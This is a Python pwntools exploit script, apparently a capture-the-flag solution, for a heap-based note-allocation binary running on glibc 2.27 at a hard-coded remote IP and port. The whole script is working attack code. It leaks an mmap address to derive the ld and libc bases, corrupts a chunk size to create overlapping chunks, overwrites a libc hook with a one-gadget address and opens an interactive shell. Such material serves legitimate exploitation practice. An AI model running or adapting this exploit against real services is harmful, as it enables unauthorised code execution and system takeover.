#!/usr/bin/env python3

from pwn import *

exe = ELF("./unintended_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("193.57.159.27",59314)

sl = lambda a ,b : r.sendlineafter(a,b)
s = lambda a ,b : r.sendafter(a,b)

def alloc(index, category, name, size, desc):
    sl("> ", "1")
    sl(": ", str(index))
    s(": ", category)
    s(": ", name)
    sl(": ", str(size))
    s(": ", desc)
    sl(": ", str(0x4d))

def free(index):
    sl("> ", "4")
    sl(": ", str(index))

def change_desc(index, new_desc):
    sl("> ", "2")
    sl(": ", str(index))
    s(": ", new_desc)

def view(index):
    sl("> ", "3")
    sl(": ", str(index))

remotely = True

#def alloc(index, category, name, size, desc):

def main():
    
    alloc(0, "M"*0x10, "N"*0x10, 200000, b"0"*0x20)
    alloc(1, "web", "NOTME", 0x28, b"1"*0x28)
    alloc(2, "web", "NOTME", 0x28, b"2"*0x28)
    alloc(3, "web", "NOTME", 0x28, b"3"*0x28)
    
    view(0)

    r.recvuntil(b"N"*0x10)
    mmap = u64(r.recv(6) + p16(0))
    log.warn("mmap area @ 0x%x", mmap)
    if remotely:
        ld_base = mmap - 0x1f0000 - 0x10 - 0x6000
    else:
        ld_base = mmap - 0x1f0000 - 0x10

    libc_base = ld_base - 0x3f1000

    change_desc(1, b"M"*0x28 + p8(0xb1))

    free(2)
   
    got_overwrite = libc_base + 0x3eb140

    alloc(2, b"web", "IDK", 0xb0-0x8, b"A"*0x70 + b"web" + b"A"*(0x20 - 3)+ p64(got_overwrite))

    change_desc(3, p64(libc_base + 0x10a41c)[:6:])
    
    sl("> ", "1")

    for _ in range(3) :
        sl(": ", "5")

    r.interactive()


if __name__ == "__main__":
    main()
